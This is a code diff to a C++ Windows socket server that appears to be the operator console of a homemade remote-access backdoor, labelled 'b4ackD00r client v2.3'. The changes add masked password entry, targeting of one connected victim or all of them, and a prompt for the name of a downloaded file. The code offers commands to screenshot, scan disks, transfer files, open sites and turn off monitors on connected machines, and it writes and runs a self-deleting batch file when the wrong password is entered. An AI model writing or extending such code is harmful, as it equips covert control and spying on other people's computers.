@@ -10,6 +10,7 @@
 #include <fstream>
 #include <WS2tcpip.h>
 #include <string>
+#include <conio.h>
 #include <thread>
 #define PRINTNUSERS if (ClientCount>=0) printf("%d user on-line\n", ClientCount); \
         else printf("No User on-line\n");
@@ -29,81 +30,115 @@ bool checkend(char *arr,int len) {
 }
 
 void concheck(SOCKET Connect1, SOCKET Listen1, HOSTENT *hst, sockaddr_in client_addr) {
-	while (1) {
-		if (Connect1 = accept(Listen1, NULL, NULL)) {
+		int client_addr_size = sizeof(client_addr);
+		while ((Connect1 = accept(Listen1, (sockaddr*)& client_addr, \
+			& client_addr_size)))
+		{
 			ClientCount++;
-			Connections[ClientCount] = Connect1;
-			printf("Client connected\n");
+			HOSTENT* hst;
+			hst = gethostbyaddr((char*)& client_addr.sin_addr.s_addr, 4, AF_INET);
 			printf("+%s [%s] new connect!\n",
 				(hst) ? hst->h_name : "", inet_ntoa(client_addr.sin_addr));
 			PRINTNUSERS
+				Connections[ClientCount] = Connect1;
 		}
 	}
-}
 
 bool start() {
-	std::string pass;
+	using namespace std;
+	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
+	std::string pass="welive";
 	std::string greetings = "Hello, user, enter password:\n";
 	for (int i = 0; i < greetings.size(); i++) {
 		std::cout << greetings[i];
 		if (i % 2 == 0)Sleep(250);
 		else Sleep(100);
 	}
-	std::getline(std::cin, pass);
-	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
-	if (pass != "we live in a cruel world") { SetConsoleTextAttribute(handle, FOREGROUND_RED);
-	std::cout << "Nice try.\n";
-	Sleep(5000);
-	char delfile[] = "@echo off\n:loop\ndel Server.exe\nif exist 1.txt goto : loop\ndel %0";
-	std::ofstream File;
-	File.open("del.bat");
-	File << delfile;
-	File.close();
-	system("start del.bat");
-	return 0;
-	};
-	SetConsoleTextAttribute(handle, FOREGROUND_GREEN);
-	std::string scull[] = {
-		"            aad8888888baa                            ",
-		"         d:?88888888888?::8b                         ",
-		"      d8888:888888888??a888888b                      ",
-		"    d8888888a8888888aa8888888888b                    ",
-		"   dP        88888888888        Yb",
-		"  dP        @Y888888888P        @Yb                        ",
-		" d8           Y8888888P           8b                     ",
-		" 88            Y88888P            8b                   ",
-		" Y8baaaaaaaaaa88P T Y88aaaaaaaaaad8P                  ",
-		"   Y88888888888P  |  Y88888888888P                    ",
-		"            888   |   888                             ",
-		"            8888888888888b                          ",
-		"            88888888888888",
-		"           d88888888888888                                      ",
-		"           88  88  88   88                                      ",
-		"           88  88  88   88                                     ",
-		"           88  88  P    88                                    ",
-		"           88  88       88                                ",
-	};
-	Sleep(3000);
-	std::cout << "Access granted\n";
-	Sleep(1000);
-	SetConsoleTextAttribute(handle, FOREGROUND_RED);
-	std::cout << std::endl << "           b4ackD00r client v2.3\n\n";
-	Sleep(1000);
-	mciSendString("play C:\\Users\\Explo\\source\\repos\\Client\\12.mp3", NULL, 0, NULL);
-	for (int i = 0; i < sizeof(scull)/sizeof(*scull); i++) {
-		std::cout << "   " << scull[i] << std::endl;
-		Sleep(480);
+	string input_password;
+	char choice;
+	unsigned char p;
+		do
+		{
+			p = _getch();
+
+			if (p == 13) break;
+			if (p == '\b' && !input_password.empty())
+			{
+				cout << '\b';
+				cout << ' ';
+				cout << '\b';
+
+				input_password.pop_back();
+				continue;
+			}
+			if (isalnum((unsigned char)p))
+			{
+				cout << '*';
+				input_password.push_back(p);
+			}
+
+		} while (true);
+
+		if (input_password == pass)
+		{
+			SetConsoleTextAttribute(handle, FOREGROUND_GREEN);
+			cout << "\nAccess granted\n";
+		}
+		else
+		{
+			SetConsoleTextAttribute(handle, FOREGROUND_RED);
+			std::cout << "\nNice try.\n";
+			Sleep(1000);
+			char delfile[] = "@echo off\n:loop\ndel Server.exe\nif exist 1.txt goto : loop\ndel %0";
+			std::ofstream File;
+			File.open("del.bat");
+			File << delfile;
+			File.close();
+			system("start del.bat");
+			return 0;
+		}
+
+		std::string scull[] = {
+			"            aad8888888baa                            ",
+			"         d:?88888888888?::8b                         ",
+			"      d8888:888888888??a888888b                      ",
+			"    d8888888a8888888aa8888888888b                    ",
+			"   dP        88888888888        Yb                   ",
+			"  dP        @Y888888888P        @Yb                  ",
+			" d8           Y8888888P           8b                 ",
+			" 88            Y88888P            8b                 ",
+			" Y8baaaaaaaaaa88P T Y88aaaaaaaaaad8P                 ",
+			"   Y88888888888P  |  Y88888888888P                   ",
+			"            888   |   888                            ",
+			"            8888888888888b                           ",
+			"            88888888888888                           ",
+			"           d88888888888888                           ",
+			"           88  88  88   88                           ",
+			"           88  88  88   88                           ",
+			"           88  88  P    88                           ",
+			"           88  88       88                           ",
+		};
+		Sleep(3000);
+		Sleep(1000);
+		SetConsoleTextAttribute(handle, FOREGROUND_RED);
+		std::cout << std::endl << "           b4ackD00r client v2.3\n\n";
+		Sleep(1000);
+		mciSendString("play C:\\Users\\Explo\\source\\repos\\Client\\12.mp3", NULL, 0, NULL);
+		for (int i = 0; i < sizeof(scull) / sizeof(*scull); i++) {
+			std::cout << "   " << scull[i] << std::endl;
+			Sleep(480);
+		}
+
+		SetConsoleTextAttribute(handle, 0x7);
+		return 1;
 	}
 
-	SetConsoleTextAttribute(handle, 0x7);
-	return 1;
-}
 
 int main() {
-	if (!start())return 0;
 	setlocale(LC_ALL, "russian");
 	SetConsoleCP(1251);
 	SetConsoleOutputCP(1251);
+	//if (!start())return 0;
 	WSAData data;
 	WORD version = MAKEWORD(2, 2);
 	int res = WSAStartup(version, &data);
@@ -134,12 +169,15 @@ int main() {
 
 	printf("\nStarting server...");
 	sockaddr_in client_addr;
+	//
 
+	//
 	int client_addr_size = sizeof(client_addr);
 	HOSTENT *hst;
 	hst = gethostbyaddr((char *)&client_addr.sin_addr.s_addr, 4, AF_INET);
 		char m_connect[256] = "--i";
-		if (Connect = accept(Listen, NULL, NULL)) {
+		if (Connect = accept(Listen, (sockaddr*)& client_addr, \
+			& client_addr_size)) {
 			ClientCount++;
 			printf("Client connected\n");
 			printf("+%s [%s] new connect!\n",
@@ -153,11 +191,12 @@ int main() {
 		while (true) {
 			char m_connect[256] = "";
 			int i = 0;
+			int ClientNum = 0;
 			std::cout << "Select one of the connected users\n";
 			for (int i = 1; i <= ClientCount; i++) {
 				std::cout << "[" << i <<"]" << std::endl;
 			}
-			std::cin >> ClientCount;
+			std::cin >> ClientNum;
 			std::cin.clear();
 			std::cin.ignore();
 			std::cout << "Enter the command:  \n-- s send the file \n--m display the message \n--o turn off the monitor \n--e close the client \n--w open the site \n--c take a screenshot\n--d download file\n dir scan disk\n";
@@ -167,8 +206,13 @@ int main() {
 				i++;
 				a = getchar();
 			}
-			for (int i = 0; i <= ClientCount; i++) {
-				send(Connections[i], m_connect, strlen(m_connect), NULL);
+			if (ClientNum != 0) {
+					send(Connections[ClientNum], m_connect, strlen(m_connect), NULL);
+			}
+			else {
+				for (int i = 1; i <= ClientCount; i++) {
+					send(Connections[i], m_connect, strlen(m_connect), NULL);
+				}
 			}
 			if ((m_connect[0] == '-')&&(m_connect[1]=='-')&&((m_connect[2] == 's'))) {
 				const int buflen = 1024;
@@ -260,7 +304,10 @@ int main() {
 			else if ((m_connect[0] == '-') && (m_connect[1] == '-') && ((m_connect[2] == 'd'))) {
 				std::cout << "Trying to download file\n";
 				HANDLE hFile;
-				hFile = CreateFile("download.txt",
+				char download[256] = "";
+				std::cout << "Enter filename:\n";
+				std::cin >> download;
+				hFile = CreateFile(download,
 					GENERIC_WRITE,
 					0,
 					NULL,
